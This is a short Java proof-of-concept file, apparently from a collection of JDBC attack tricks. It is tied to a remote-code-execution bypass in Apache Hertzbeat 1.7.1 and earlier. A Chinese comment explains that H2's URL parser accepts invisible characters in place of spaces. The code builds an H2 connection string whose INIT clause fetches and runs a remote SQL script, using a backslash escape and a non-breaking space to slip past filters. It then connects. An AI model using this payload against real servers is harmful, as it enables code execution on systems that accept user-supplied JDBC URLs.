package com.jdbc.tricks;

import java.sql.Connection;
import java.sql.DriverManager;

// 在h2进行解析的时候，可以利用一些其他字符代替空格，构造出无空格的poc，比如\t、一些不可见字符等等，该poc来自于Apache Hertzbeat<=1.7.1 h2 jdbc RCE:https://fushuling.com/index.php/2025/07/07/apache-hertzbeat-rce-bypass/，注意，前面的文件路径需要是一个合法的路径
public class NoSpacePoc {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:h2://mem/testdb;TRACE_LEVEL_SYSTEM_OUT=3;IN\\IT=RUN\\SCRIPT\u00A0FROM'http://127.0.0.1:50025/poc.sql'";
        Connection conn = DriverManager.getConnection(url);
    }
}
